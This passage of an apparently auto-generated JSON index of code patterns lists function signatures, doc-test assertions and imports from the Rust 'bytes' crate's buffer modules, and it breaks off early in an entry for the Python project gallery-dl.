          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_u16_le(",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, u16::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0809_u16), buf.try_get_u16_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_u16_ne(",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, u16::from_ne_bytes)",
          "/// assert_eq!(Ok(0x0809_i16), buf.try_get_i16());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_i16());",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, i16::from_be_bytes)",
          "/// assert_eq!(Ok(0x0809_i16), buf.try_get_i16_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_i16_le(",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, i16::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0809_i16), buf.try_get_i16_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 2, available: 1}), buf.try_get_i16_ne(",
          "/// assert_eq!(1, buf.remaining());",
          "buf_try_get_impl!(self, i16::from_ne_bytes)",
          "/// assert_eq!(Ok(0x0809A0A1), buf.try_get_u32());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_u32());",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, u32::from_be_bytes)",
          "/// assert_eq!(Ok(0x0809A0A1_u32), buf.try_get_u32_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_u32_le(",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, u32::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0809A0A1_u32), buf.try_get_u32_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_u32_ne(",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, u32::from_ne_bytes)",
          "/// assert_eq!(Ok(0x0809A0A1_i32), buf.try_get_i32());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_i32());",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, i32::from_be_bytes)",
          "/// assert_eq!(Ok(0x0809A0A1_i32), buf.try_get_i32_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_i32_le(",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, i32::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0809A0A1_i32), buf.try_get_i32_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_i32_ne(",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(self, i32::from_ne_bytes)",
          "/// assert_eq!(Ok(0x0102030405060708_u64), buf.try_get_u64());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_u64());",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, u64::from_be_bytes)",
          "/// assert_eq!(Ok(0x0102030405060708_u64), buf.try_get_u64_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_u64_le(",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, u64::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0102030405060708_u64), buf.try_get_u64_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_u64_ne(",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, u64::from_ne_bytes)",
          "/// assert_eq!(Ok(0x0102030405060708_i64), buf.try_get_i64());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_i64());",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, i64::from_be_bytes)",
          "/// assert_eq!(Ok(0x0102030405060708_i64), buf.try_get_i64_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_i64_le(",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, i64::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x0102030405060708_i64), buf.try_get_i64_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_i64_ne(",
          "/// assert_eq!(7, buf.remaining());",
          "buf_try_get_impl!(self, i64::from_ne_bytes)",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_u128), buf.try_get_u128());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_u128(",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, u128::from_be_bytes)",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_u128), buf.try_get_u128_le(",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_u128_",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, u128::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_u128), buf.try_get_u128_ne(",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_u128_",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, u128::from_ne_bytes)",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_i128), buf.try_get_i128());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_i128(",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, i128::from_be_bytes)",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_i128), buf.try_get_i128_le(",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_i128_",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, i128::from_le_bytes)",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x01020304050607080910111213141516_i128), buf.try_get_i128_ne(",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 16, available: 15}), buf.try_get_i128_",
          "/// assert_eq!(15, buf.remaining());",
          "buf_try_get_impl!(self, i128::from_ne_bytes)",
          "/// assert_eq!(Ok(0x010203_u64), buf.try_get_uint(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_uint(4)",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(be => self, u64, nbytes);",
          "/// assert_eq!(Ok(0x010203_u64), buf.try_get_uint_le(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_uint_le",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(le => self, u64, nbytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x010203_u64), buf.try_get_uint_ne(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_uint_ne",
          "/// assert_eq!(3, buf.remaining());",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x010203_i64), buf.try_get_int(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_int(4))",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(be => self, i64, nbytes);",
          "/// assert_eq!(Ok(0x010203_i64), buf.try_get_int_le(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_int_le(",
          "/// assert_eq!(3, buf.remaining());",
          "buf_try_get_impl!(le => self, i64, nbytes);",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Ok(0x010203_i64), buf.try_get_int_ne(3));",
          "/// assert_eq!(6, buf.remaining());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_int_ne(",
          "/// assert_eq!(3, buf.remaining());",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f32, buf.get_f32());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_f32());",
          "/// assert_eq!(3, buf.remaining());",
          "/// assert_eq!(1.2f32, buf.get_f32_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_f32_le(",
          "/// assert_eq!(3, buf.remaining());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f32, buf.get_f32_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 4, available: 3}), buf.try_get_f32_ne(",
          "/// assert_eq!(3, buf.remaining());",
          "/// assert_eq!(1.2f64, buf.get_f64());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_f64());",
          "/// assert_eq!(7, buf.remaining());",
          "/// assert_eq!(1.2f64, buf.get_f64_le());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_f64_le(",
          "/// assert_eq!(7, buf.remaining());",
          "/// let mut buf: &[u8] = match cfg!(target_endian = \"big\") {",
          "/// assert_eq!(1.2f64, buf.get_f64_ne());",
          "/// assert_eq!(6, buf.remaining());",
          "/// assert_eq!(Err(TryGetError{requested: 8, available: 7}), buf.try_get_f64_ne(",
          "/// assert_eq!(7, buf.remaining());",
          "/// assert_eq!(&bytes[..], &b\"hello\"[..]);",
          "/// assert_eq!(dst, b\"hello\");",
          "/// assert_eq!(dst, b\" world\");",
          "/// assert_eq!(full.chunk(), b\"hello world\");",
          "/// assert_eq!(11, num);",
          "/// assert_eq!(&dst[..11], &b\"hello world\"[..]);",
          "deref_forward_buf!();",
          "deref_forward_buf!();"
        ],
        "derives": [],
        "error_handling": 39
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/vec_deque.rs",
        "function_defs": [
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn chunks_vectored<'a>(&'a self, dst: &mut [io::IoSlice<'a>]) -> usize {",
          "fn advance(&mut self, cnt: usize) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Buf for VecDeque<u8> {"
        ],
        "uses": [
          "use alloc::collections::VecDeque;",
          "use std::io;",
          "use super::Buf;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/uninit_slice.rs",
        "function_defs": [
          "fn uninit_ref(slice: &[MaybeUninit<u8>]) -> &UninitSlice {",
          "fn fmt(&self, fmt: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(slice: &'a mut [u8]) -> Self {",
          "fn from(slice: &'a mut [MaybeUninit<u8>]) -> Self {",
          "fn index(&self, index: $t) -> &UninitSlice {",
          "fn index_mut(&mut self, index: $t) -> &mut UninitSlice {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl UninitSlice {",
          "impl fmt::Debug for UninitSlice {",
          "impl Index<$t> for UninitSlice {",
          "impl IndexMut<$t> for UninitSlice {"
        ],
        "uses": [
          "use core::fmt;",
          "use core::mem::MaybeUninit;",
          "use core::ops::{",
          "use core::ptr;"
        ],
        "macros": [
          "/// assert_eq!(b\"boo\", &data[..]);",
          "assert!(index < self.len());",
          "/// assert_eq!(b\"bar\", &data[..]);",
          "assert_eq!(self.len(), src.len());",
          "/// assert_eq!(len, 3);",
          "impl_index!("
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/buf_mut.rs",
        "function_defs": [
          "fn remaining_mut(&self) -> usize;",
          "fn has_remaining_mut(&self) -> bool {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice;",
          "fn put<T: super::Buf>(&mut self, mut src: T)",
          "fn put_slice(&mut self, mut src: &[u8]) {",
          "fn put_bytes(&mut self, val: u8, mut cnt: usize) {",
          "fn put_u8(&mut self, n: u8) {",
          "fn put_i8(&mut self, n: i8) {",
          "fn put_u16(&mut self, n: u16) {",
          "fn put_u16_le(&mut self, n: u16) {",
          "fn put_u16_ne(&mut self, n: u16) {",
          "fn put_i16(&mut self, n: i16) {",
          "fn put_i16_le(&mut self, n: i16) {",
          "fn put_i16_ne(&mut self, n: i16) {",
          "fn put_u32(&mut self, n: u32) {",
          "fn put_u32_le(&mut self, n: u32) {",
          "fn put_u32_ne(&mut self, n: u32) {",
          "fn put_i32(&mut self, n: i32) {",
          "fn put_i32_le(&mut self, n: i32) {",
          "fn put_i32_ne(&mut self, n: i32) {",
          "fn put_u64(&mut self, n: u64) {",
          "fn put_u64_le(&mut self, n: u64) {",
          "fn put_u64_ne(&mut self, n: u64) {",
          "fn put_i64(&mut self, n: i64) {",
          "fn put_i64_le(&mut self, n: i64) {",
          "fn put_i64_ne(&mut self, n: i64) {",
          "fn put_u128(&mut self, n: u128) {",
          "fn put_u128_le(&mut self, n: u128) {",
          "fn put_u128_ne(&mut self, n: u128) {",
          "fn put_i128(&mut self, n: i128) {",
          "fn put_i128_le(&mut self, n: i128) {",
          "fn put_i128_ne(&mut self, n: i128) {",
          "fn put_uint(&mut self, n: u64, nbytes: usize) {",
          "fn put_uint_le(&mut self, n: u64, nbytes: usize) {",
          "fn put_uint_ne(&mut self, n: u64, nbytes: usize) {",
          "fn put_int(&mut self, n: i64, nbytes: usize) {",
          "fn put_int_le(&mut self, n: i64, nbytes: usize) {",
          "fn put_int_ne(&mut self, n: i64, nbytes: usize) {",
          "fn put_f32(&mut self, n: f32) {",
          "fn put_f32_le(&mut self, n: f32) {",
          "fn put_f32_ne(&mut self, n: f32) {",
          "fn put_f64(&mut self, n: f64) {",
          "fn put_f64_le(&mut self, n: f64) {",
          "fn put_f64_ne(&mut self, n: f64) {",
          "fn limit(self, limit: usize) -> Limit<Self>",
          "fn writer(self) -> Writer<Self>",
          "fn chain_mut<U: BufMut>(self, next: U) -> Chain<Self, U>",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put_slice(&mut self, src: &[u8]) {",
          "fn put_u8(&mut self, n: u8) {",
          "fn put_i8(&mut self, n: i8) {",
          "fn put_u16(&mut self, n: u16) {",
          "fn put_u16_le(&mut self, n: u16) {",
          "fn put_u16_ne(&mut self, n: u16) {",
          "fn put_i16(&mut self, n: i16) {",
          "fn put_i16_le(&mut self, n: i16) {",
          "fn put_i16_ne(&mut self, n: i16) {",
          "fn put_u32(&mut self, n: u32) {",
          "fn put_u32_le(&mut self, n: u32) {",
          "fn put_u32_ne(&mut self, n: u32) {",
          "fn put_i32(&mut self, n: i32) {",
          "fn put_i32_le(&mut self, n: i32) {",
          "fn put_i32_ne(&mut self, n: i32) {",
          "fn put_u64(&mut self, n: u64) {",
          "fn put_u64_le(&mut self, n: u64) {",
          "fn put_u64_ne(&mut self, n: u64) {",
          "fn put_i64(&mut self, n: i64) {",
          "fn put_i64_le(&mut self, n: i64) {",
          "fn put_i64_ne(&mut self, n: i64) {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put_slice(&mut self, src: &[u8]) {",
          "fn put_bytes(&mut self, val: u8, cnt: usize) {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put_slice(&mut self, src: &[u8]) {",
          "fn put_bytes(&mut self, val: u8, cnt: usize) {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn put<T: super::Buf>(&mut self, mut src: T)",
          "fn put_slice(&mut self, src: &[u8]) {",
          "fn put_bytes(&mut self, val: u8, cnt: usize) {",
          "fn _assert_trait_object(_b: &dyn BufMut) {}"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::buf::{limit, Chain, Limit, UninitSlice};",
          "use crate::buf::{writer, Writer};",
          "use crate::{panic_advance, panic_does_not_fit, TryGetError};",
          "use core::{mem, ptr, usize};",
          "use alloc::{boxed::Box, vec::Vec};"
        ],
        "macros": [
          "/// assert_eq!(buf, b\"hello world\");",
          "/// assert_eq!(original_remaining - 5, buf.remaining_mut());",
          "/// assert_eq!(5, buf.len());",
          "/// assert_eq!(buf, b\"hello\");",
          "/// assert!(buf.has_remaining_mut());",
          "/// assert!(!buf.has_remaining_mut());",
          "/// assert_eq!(5, buf.len());",
          "/// assert_eq!(buf, b\"hello\");",
          "/// assert_eq!(buf, b\"hello world\");",
          "///     assert_eq!(1, buf.remaining_mut());",
          "/// assert_eq!(b\"hello\\0\", &dst);",
          "///     assert_eq!(2, buf.remaining_mut());",
          "/// assert_eq!(b\"aaaa\\0\\0\", &dst);",
          "/// assert_eq!(buf, b\"\\x01\");",
          "/// assert_eq!(buf, b\"\\x01\");",
          "/// assert_eq!(buf, b\"\\x08\\x09\");",
          "/// assert_eq!(buf, b\"\\x09\\x08\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x08\\x09\");",
          "///     assert_eq!(buf, b\"\\x09\\x08\");",
          "/// assert_eq!(buf, b\"\\x08\\x09\");",
          "/// assert_eq!(buf, b\"\\x09\\x08\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x08\\x09\");",
          "///     assert_eq!(buf, b\"\\x09\\x08\");",
          "/// assert_eq!(buf, b\"\\x08\\x09\\xA0\\xA1\");",
          "/// assert_eq!(buf, b\"\\xA1\\xA0\\x09\\x08\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x08\\x09\\xA0\\xA1\");",
          "///     assert_eq!(buf, b\"\\xA1\\xA0\\x09\\x08\");",
          "/// assert_eq!(buf, b\"\\x08\\x09\\xA0\\xA1\");",
          "/// assert_eq!(buf, b\"\\xA1\\xA0\\x09\\x08\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x08\\x09\\xA0\\xA1\");",
          "///     assert_eq!(buf, b\"\\xA1\\xA0\\x09\\x08\");",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\");",
          "/// assert_eq!(buf, b\"\\x08\\x07\\x06\\x05\\x04\\x03\\x02\\x01\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\");",
          "///     assert_eq!(buf, b\"\\x08\\x07\\x06\\x05\\x04\\x03\\x02\\x01\");",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\");",
          "/// assert_eq!(buf, b\"\\x08\\x07\\x06\\x05\\x04\\x03\\x02\\x01\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\");",
          "///     assert_eq!(buf, b\"\\x08\\x07\\x06\\x05\\x04\\x03\\x02\\x01\");",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x10\\x11\\x12\\x13\\x14\\x",
          "/// assert_eq!(buf, b\"\\x16\\x15\\x14\\x13\\x12\\x11\\x10\\x09\\x08\\x07\\x06\\x05\\x04\\x03\\x",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x10\\x11\\x12\\x13\\x",
          "///     assert_eq!(buf, b\"\\x16\\x15\\x14\\x13\\x12\\x11\\x10\\x09\\x08\\x07\\x06\\x05\\x04\\x",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x10\\x11\\x12\\x13\\x14\\x",
          "/// assert_eq!(buf, b\"\\x16\\x15\\x14\\x13\\x12\\x11\\x10\\x09\\x08\\x07\\x06\\x05\\x04\\x03\\x",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x10\\x11\\x12\\x13\\x",
          "///     assert_eq!(buf, b\"\\x16\\x15\\x14\\x13\\x12\\x11\\x10\\x09\\x08\\x07\\x06\\x05\\x04\\x",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\");",
          "/// assert_eq!(buf, b\"\\x03\\x02\\x01\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\");",
          "///     assert_eq!(buf, b\"\\x03\\x02\\x01\");",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\");",
          "/// assert_eq!(buf, b\"\\x03\\x02\\x01\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\");",
          "///     assert_eq!(buf, b\"\\x03\\x02\\x01\");",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(buf, b\"\\x3F\\x99\\x99\\x9A\");",
          "/// assert_eq!(buf, b\"\\x9A\\x99\\x99\\x3F\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x3F\\x99\\x99\\x9A\");",
          "///     assert_eq!(buf, b\"\\x9A\\x99\\x99\\x3F\");",
          "/// assert_eq!(buf, b\"\\x3F\\xF3\\x33\\x33\\x33\\x33\\x33\\x33\");",
          "/// assert_eq!(buf, b\"\\x33\\x33\\x33\\x33\\x33\\x33\\xF3\\x3F\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x3F\\xF3\\x33\\x33\\x33\\x33\\x33\\x33\");",
          "///     assert_eq!(buf, b\"\\x33\\x33\\x33\\x33\\x33\\x33\\xF3\\x3F\");",
          "/// assert_eq!(arr.remaining_mut(), 128);",
          "/// assert_eq!(dst.remaining_mut(), 10);",
          "/// assert_eq!(11, num);",
          "/// assert_eq!(*buf, b\"hello world\"[..]);",
          "/// assert_eq!(&a[..], b\"hello\");",
          "/// assert_eq!(&b[..], b\" world\");",
          "deref_forward_bufmut!();",
          "deref_forward_bufmut!();"
        ],
        "derives": [],
        "error_handling": 7
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/take.rs",
        "function_defs": [
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, cnt: usize) {",
          "fn copy_to_bytes(&mut self, len: usize) -> crate::Bytes {",
          "fn chunks_vectored<'a>(&'a self, dst: &mut [IoSlice<'a>]) -> usize {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::Buf;",
          "use core::cmp;",
          "use std::io::IoSlice;"
        ],
        "macros": [
          "/// assert_eq!(*dst, b\"he\"[..]);",
          "/// assert_eq!(*dst, b\"llo world\"[..]);",
          "/// assert_eq!(11, buf.get_ref().remaining());",
          "/// assert_eq!(*dst, b\"ll\"[..]);",
          "/// assert_eq!(2, buf.limit());",
          "/// assert_eq!(b'h', buf.get_u8());",
          "/// assert_eq!(1, buf.limit());",
          "/// assert_eq!(*dst, b\"he\"[..]);",
          "/// assert_eq!(*dst, b\"llo\"[..]);",
          "assert!(cnt <= self.limit);",
          "assert!(len <= self.remaining(), \"`len` greater than remaining\");"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/writer.rs",
        "function_defs": [
          "fn write(&mut self, src: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::BufMut;",
          "use std::{cmp, io};"
        ],
        "macros": [
          "/// assert_eq!(1024, buf.get_ref().capacity());",
          "/// assert_eq!(1024, buf.get_ref().capacity());",
          "/// assert_eq!(*buf, b\"hello world\"[..]);"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1/src/buf/reader.rs",
        "function_defs": [
          "fn read(&mut self, dst: &mut [u8]) -> io::Result<usize> {",
          "fn fill_buf(&mut self) -> io::Result<&[u8]> {",
          "fn consume(&mut self, amt: usize) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::Buf;",
          "use std::{cmp, io};"
        ],
        "macros": [
          "/// assert_eq!(b\"hello world\", buf.get_ref());",
          "/// assert_eq!(0, buf.remaining());"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 1
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/# 2/Stash/external/gallery-dl",
    "name": "gallery-dl",
    "languages": [
      "Python",
      "JavaScript"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/setup.py",
        "docstrings": [],
        "function_defs": [
          "def read(fname):",
          "def check_file(fname):",
          "def build_py2exe():",
          "def build_setuptools():"
        ],
        "class_defs": [],
        "imports": [
          "import re",
          "import sys",
          "import os.path",
          "import warnings",
          "from py2exe import freeze",
          "from setuptools import setup"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# get version without importing the package",
          "# py2exe dislikes version specifiers with a trailing '-dev'"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/# 2/Stash/external/gallery-dl/gallery_dl/__init__.py",
        "docstrings": [],
        "function_defs": [
          "def main():",
          "def __init__(self):",
          "def add_url(self, url):",
          "def add_list(self, urls):",
          "def add_file(self, path, action=None):\n\"\"\"Process an input file.\n\nLines starting with '#' and empty lines will be ignored.\nLines starting with '-' will be interpreted as a key-value pair\nseparated by an '='. where\n'key' is a dot-separated option name and\n'value' is a JSON-parsable string.\nThese configuration options will be applied\nwhile processing the next URL only.",
          "def progress(self, pformat=True):",
          "def next(self):",
          "def success(self):",
          "def error(self):",
          "def _rewrite(self):",
          "def _action_comment(self, lines, indicies):",
          "def _action_delete(self, lines, indicies):",
          "def __iter__(self):",
          "def __next__(self):",
          "def __init__(self, url, gconf, lconf):",
          "def __str__(self):"
        ],
        "class_defs": [
          "class InputManager():",
          "class ExtendedUrl():"
        ],
        "imports": [
          "import sys",
          "import logging",
          "from . import version, config, option, output, extractor, job, util, exception",
          "import yaml",
          "import tomllib as toml",
          "import toml",
          "import signal",
          "from . import actions",
          "from ctypes import windll, wintypes, byref",
          "from . import formatter",
          "import platform",
          "import requests",
          "from . import cache",
          "import requests",
          "from . import update",
          "import os",
          "import itertools",
          "from .extractor import common",
          "import errno"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Copyright 2014-2025 Mike F\u00e4hrmann",
          "#",
          "# This program is free software; you can redistribute it and/or modify",
          "# it under the terms of the GNU General Public License version 2 as",
          "# published by the Free Software Foundation.",
          "# configuration",
          "# signals",
          "# enable ANSI escape sequences on Windows",
          "# filter environment",
          "# format string separator",
          "# eval globals",
          "# loglevels",
          "# category renaming",
          "# extractor modules",
          "# external modules",
          "# unsupported file logging handler",
          "# error file logging handler",
          "# collect input URLs",
          "# process input URLs",
          "# settings global options",
          "# setting local options for the next URL",
          "# next URL uses default filename and 'skip' is false.",
          "# empty line or comment",
